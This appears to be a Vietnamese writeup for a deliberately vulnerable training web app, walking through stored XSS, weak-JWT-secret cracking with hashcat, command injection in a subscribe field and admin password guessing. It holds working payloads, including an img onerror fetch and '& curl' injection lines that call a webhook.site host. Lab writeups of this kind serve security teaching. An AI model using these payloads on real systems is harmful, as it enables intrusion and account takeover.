## Writeup

### XSS

Đầu tiên vào `/settings` và bật XSS: Yes

![image](https://github.com/user-attachments/assets/e3d22f64-2713-4d4a-9a6c-82eb4faf578c)

Ở phần trang chủ có chức năng `Send messages` cho admin xem

![image](https://github.com/user-attachments/assets/f3b35e9a-47f8-4701-ae93-4078702381ae)

=> Gửi messages: `<img src=1 onerror=fetch("https://webhook.site/8bab6bcd-4a1b-4735-a2e1-5139468d7126")>`

Sau đó admin qua messages check messages, 1 request đến webhook được tạo ra

![image](https://github.com/user-attachments/assets/b99969dd-3ee2-44f9-adb0-f68f0923957a)

XSS xảy ra tại `dangerouslySetInnerHTML`

![image](https://github.com/user-attachments/assets/07f87375-dbde-4570-a629-dcfbfd572d95)


### JWT

![image](https://github.com/user-attachments/assets/12f422ef-b637-40a5-8a45-ad6e8a6f50c2)

Lỗ hổng JWT này xảy ra do sử dụng secretkey yếu (dễ dàng wordlists)

Mở Kali Linux, sử dụng hashcat:

`hashcat -m 16500 -a 0 <token> <wordlist>`

=> Secretkey là `changeme`

![image](https://github.com/user-attachments/assets/bb95b04c-9914-48b7-bd48-13657e9d8792)

Từ secretkey này + token, vào trang jwt.io để chỉnh các thông tin để vào được tài khoản admin

Nếu status của JWT là No thì sẽ được cấp secretkey phức tạp

![image](https://github.com/user-attachments/assets/946bbc90-34f4-4a38-b48c-508c933d17e4)


### Command Injection

Lỗ hổng này xảy ra ở chức năng subscribe

![image](https://github.com/user-attachments/assets/90868d37-037b-43ae-9953-065d2f82f492)

![image](https://github.com/user-attachments/assets/49f817bc-a19c-4857-80cf-0938f6050cf6)

Payload

__Windows__

```
attacker@example.com & C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe curl https://webhook.site/8bab6bcd-4a1b-4735-a2e1-5139468d7126 & echo hacked
```

__MacOS/Linux__

```
attacker@example.com & curl https://webhook.site/8bab6bcd-4a1b-4735-a2e1-5139468d7126 & echo hacked
```

### Authentication

Lỗ hổng này tập trung vào việc bruteforce mật khẩu của tài khoản admin

Tk: `admin@example.com`

Mk: `123456`

Nếu mode No của Authentication: Mk: `H@123456`
